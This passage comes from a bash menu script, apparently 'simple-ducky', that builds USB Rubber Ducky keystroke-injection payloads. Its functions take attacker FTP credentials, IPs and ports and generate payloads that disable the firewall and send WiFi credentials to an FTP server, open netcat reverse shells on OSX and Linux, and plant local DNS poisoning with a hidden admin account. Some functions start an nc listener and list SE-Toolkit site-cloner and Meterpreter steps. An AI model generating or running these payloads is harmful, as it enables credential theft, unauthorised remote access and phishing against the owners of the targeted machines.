	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/ducky/encoder/payload_del5.txt > /usr/share/ducky/encoder/payload_del6.txt
	sed "/STRING/s/zippassword/$zippassword/g" /usr/share/ducky/encoder/payload_del6.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	rm /usr/share/ducky/encoder/payload_del5.txt
	rm /usr/share/ducky/encoder/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	echo -e "\e[1;34mMoving files over to your web directory and starting your web and ftp servers.\e[0m"
	sleep 4
	clear
	cp /usr/share/ducky/encoder/misc/7za.exe /var/www/7za.exe
	clear
	service apache2 restart
	clear
	service pure-ftpd restart
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Acess Point Crediential Harvester w/UAC (Win Vista/7)
#################################################################################
f_wifunVIS7uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This script will enter the command shell as an administrator, disable the firewall and export the wifi settings. The explorted setting will be sent to an ftp server of your choice."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Bucky67GTO"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/ducky/encoder/payloads/wifunVIS7uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	service pure-ftpd restart
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Acess Point Crediential Harvester w/o UAC (Win Vista/7)
#################################################################################
f_wifunVIS7nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This script will enter the command shell as an administrator, disable the firewall and export the wifi settings. The explorted setting will be sent to an ftp server of your choice."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Bucky67GTO"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/ducky/encoder/payloads/wifunVIS7nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	service pure-ftpd restart
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Acess Point Crediential Harvester w/UAC (Win 8)
#################################################################################
f_wifunWIN8uac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This script will enter the command shell as an administrator, disable the firewall and export the wifi settings. The explorted setting will be sent to an ftp server of your choice."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Bucky67GTO"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/ducky/encoder/payloads/wifunWIN8uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	service pure-ftpd restart
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# WiFi Acess Point Crediential Harvester w/o UAC (Win 8)
#################################################################################
f_wifunWIN8nouac(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This script will enter the command shell as an administrator, disable the firewall and export the wifi settings. The explorted setting will be sent to an ftp server of your choice."
	echo -e "\e[1;31mTarget:\e[0m Windows 8 w/o UAC Enabled"
	echo -e "\e[1;31mAuthor:\e[0m Bucky67GTO"
	echo ""
	echo ""
	read -p "What is the IP/Domain of your ftp server? " attackerftp
	echo ""
	read -p "What is the username for your ftp server? " attackerusername
	echo ""
	read -p "What is the password for your ftp server? " attackerpassword
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	sed "/STRING/s/attackerftp/$attackerftp/g" /usr/share/ducky/encoder/payloads/wifunWIN8nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerusername/$attackerusername/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackerpassword/$attackerpassword/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		echo -e "\e[1;34mGenerating your payload\e[0m"
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		echo -e "\e[1;34mGenerating your payload\e[0m"
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	nautilus /usr/share/ducky/encoder/ &
	clear
	service pure-ftpd restart
	clear
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
#################################################################################
#
# Linux and OSX Payloads
#
#################################################################################
#################################################################################

#################################################################################
# OSX Reverse Shell
#################################################################################
f_osxrev(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell."
	echo -e "\e[1;31mNote:\e[0m Netcat will need to be installed for this payload to work."
	echo -e "\e[1;31mTarget:\e[0m MAC OSX (Various)"
	echo -e "\e[1;31mAuthor:\e[0m Sharkey"	
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/nc/s/ipport/$attackerip $attackerport/g" /usr/share/ducky/encoder/payloads/osxrev.conf > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/ &
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# OSX Single User Mode Backdoor
#################################################################################
f_osxsingleuserrev(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to provide a reverse shell using OSX Single User Mode."
	echo -e "\e[1;31mUsage:\e[0m Boot into single user mode with (Command – S). At the command prompt, plug in the ducky. "
	echo -e "\e[1;31mNote:\e[0m Be sure to use duck_v2.1.hex or above (see ducky-decode link)."
	echo -e "\e[1;31mDucky-Decode Link:\e[0m https://code.google.com/p/ducky-decode/"
	echo -e "\e[1;31mPayload Support Page:\e[0m http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/"
	echo -e "\e[1;31mTarget:\e[0m MAC OSX"
	echo -e "\e[1;31mAuthor:\e[0m Patrick Mosca"	
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/dev/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payloads/osxsingleuserrev.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/dev/s/attackerport/$attackerport/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm payload_del.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/ &
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi
	
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Linux Reverse Shell
#################################################################################
f_linuxrev(){
	clear
	echo -e "\e[1;31mDescription:\e[0m This payload is designed to prvide a reverse shell."
	echo -e "\e[1;31mNote:\e[0m It is assumed that the victim's distro has Netcat Installed"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit)"
	echo ""
	echo ""
	read -p "Where shall I send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	echo -e "How long of a delay would like before starting? "
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	echo ""
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	sleep 2
	echo ""
	sed "/nc/s/ipport/$attackerip $attackerport/g" /usr/share/ducky/encoder/payloads/linuxrev.conf > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2	
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter	
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi 
	clear
	read -p "Would you like me to setup a listener [y/n]? " listener
	clear
	if [ "$listener" == "n" ]; then
		read -p "Would you like to return to the main menu [y/n]? " option
	else 
		gnome-terminal -x nc -lvp $attackerport &
		nautilus /usr/share/ducky/encoder/ &
		clear
		read -p "Would you like to return to the main menu [y/n]? " option
	fi
		
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}


#################################################################################
#################################################################################
#
# Forced Phishing
#
#################################################################################
#################################################################################

#################################################################################
# Local DNS Poisoning | SE-Toolkit w/UAC (Win Vista/7)
#################################################################################
f_setlocaldnsVIS7uac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. In addition, it creates an admin account, hides the admin account, drops the firewall, enables Remote Desktop & Remote Assistance. Couple this attack with the SE-Toolkit's website cloner and you will be unstoppable."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC enabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What what website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Where do you want me to send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payloads/setlocaldnsVIS7uac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload_del5.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del5.txt > /usr/share/ducky/encoder/payload_del6.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del6.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	rm /usr/share/ducky/encoder/payload_del5.txt
	rm /usr/share/ducky/encoder/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mStopping your webserver...\e[0m"
	echo ""
	sleep 2
	service apache2 stop
	clear
	echo ""
	echo -e "\e[1;34mDone!\e[0m"
	clear
	echo -e "\e[1;34mLaunching the Socail Engineering Toolkit (se-toolkit).\e[0m" 
	echo ""
	sleep 2
	gnome-terminal -x se-toolkit &
	clear
	echo -e "\e[1;34mHere are some recommended settings for the SE-Toolkit. Make changes as you see fit...\e[0m" 
	echo ""
	sleep 2
	echo ""
	echo "1) Social-Engineering Attacks"
	echo ""
	echo "2) Website Attack Vectors"
	echo ""
	echo "3) Java Applet Attack Method"
	echo ""
	echo "4) Site Cloner"
	echo ""
	echo "5) Are you using NAT/Port Forwarding [yes|no]: no"
	echo ""
	echo "6) IP address or hostname for the reverse connection: $attackerip"
	echo ""
	echo "7) Enter the url to clone: (Example: http://www.thisisafakesite.com)"
	echo ""
	echo "8) What payload do you want to generate: Windows Reverse_TCP Meterpreter"
	echo ""
	echo "9) Backdoored Executable (BEST)"
	echo ""
	echo "10) PORT of the listener [443]: $attackerport" 
	echo ""
	echo ""
	read -p "Press any key to contiue" enter
	nautilus /usr/share/ducky/encoder/ &
	clear	
	read -p "Would you like to return to the main menu [y/n]? " option
	clear
	
	case $option in
	y) simple-ducky ;;
	n) clear;exit ;;
	*) clear;exit ;;
	esac 
}

#################################################################################
# Local DNS Poisoning | SE-Toolkit w/o UAC (Win Vista/7)
#################################################################################
f_setlocaldnsVIS7nouac(){
	clear
	echo -e "\e[1;31mDiscription:\e[0m This payload is designed to setup local DNS poisioning on the victims machine. In addition, it creates an admin account, hides the admin account, drops the firewall, enables Remote Desktop & Remote Assistance. Couple this attack with the SE-Toolkit's website cloner and you will be unstoppable."
	echo -e "\e[1;31mTarget:\e[0m Windows Vista/7 with UAC disabled"
	echo -e "\e[1;31mAuthor:\e[0m Travis Weathers (skysploit) | props to ashbreeze96 and overwraith for the original concept"
	echo ""
	echo ""
	read -p "What would you like the username to be for your admin account? " attackeruser
	echo ""
	read -p "What would you like the password to be for your admin account? " attackerpass
	echo ""
	read -p "What is the IP address of your attacking webserver? " attackerip
	echo ""
	read -p "What what website do you plan on spoofing (Don't use the FQDN)(example: example.com)? " attackerdomain
	echo -e ""
	read -p "Where do you want me to send your shell? " attackerip
	echo ""
	read -p "What port will you be listening on? " attackerport
	echo ""
	read -p "Use Milliseconds (15000 ms = 15 sec) " pausemilsec
	clear
	echo -e "\e[1;34mAlmost done. Let's set your keyboard language\e[0m"
	echo ""
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payloads/setlocaldnsVIS7nouac.conf > /usr/share/ducky/encoder/payload_del.txt
	sed "/STRING/s/attackerpass/$attackerpass/g" /usr/share/ducky/encoder/payload_del.txt > /usr/share/ducky/encoder/payload_del2.txt
	sed "/STRING/s/attackeruser/$attackeruser/g" /usr/share/ducky/encoder/payload_del2.txt > /usr/share/ducky/encoder/payload_del3.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del3.txt > /usr/share/ducky/encoder/payload_del4.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del4.txt > /usr/share/ducky/encoder/payload_del5.txt
	sed "/STRING/s/attackerip/$attackerip/g" /usr/share/ducky/encoder/payload_del5.txt > /usr/share/ducky/encoder/payload_del6.txt
	sed "/STRING/s/attackerdomain/$attackerdomain/g" /usr/share/ducky/encoder/payload_del6.txt > /usr/share/ducky/encoder/payload.txt
	sed -i "1iDELAY $pausemilsec" /usr/share/ducky/encoder/payload.txt
	rm /usr/share/ducky/encoder/payload_del.txt
	rm /usr/share/ducky/encoder/payload_del2.txt
	rm /usr/share/ducky/encoder/payload_del3.txt
	rm /usr/share/ducky/encoder/payload_del4.txt
	rm /usr/share/ducky/encoder/payload_del5.txt
	rm /usr/share/ducky/encoder/payload_del6.txt
	clear
	read -p "Would you like to use a US keyboard a different format [Enter=US|o=other]? " language 
	if [ "$language" == "o" ]; then
		clear
		echo -e "\e[1;34mPlease enter the keyboard code you would like to use.\e[0m"
		echo ""
		echo "fr: French"
		echo "pt: Portuguese"
		echo "us: English-US"
		echo "be: Belgian"
		echo "da: Danish"
		echo "de: German"
		echo "no: Norwegian"
		echo "sv: Swedish"
		echo "uk: English-UK"
		echo ""
		read -p "Option: " keyboard
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""	
		sleep 2
		java -jar encoder.jar -i payload.txt  -l $keyboard -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	else 
		clear
		echo -e "\e[1;34mGenerating your inject.bin file...\e[0m"
		echo ""
		sleep 2
		java -jar encoder.jar -i payload.txt -o inject.bin
		echo ""
		echo -e "\e[1;34mYour payload has been created, its located in /usr/share/ducky/encoder\e[0m"
		echo ""
		read -p "Press any key to contiue" enter
	fi
	clear
	echo -e "\e[1;34mStopping your webserver...\e[0m"
	echo ""
	sleep 2
	service apache2 stop
	clear
	echo ""
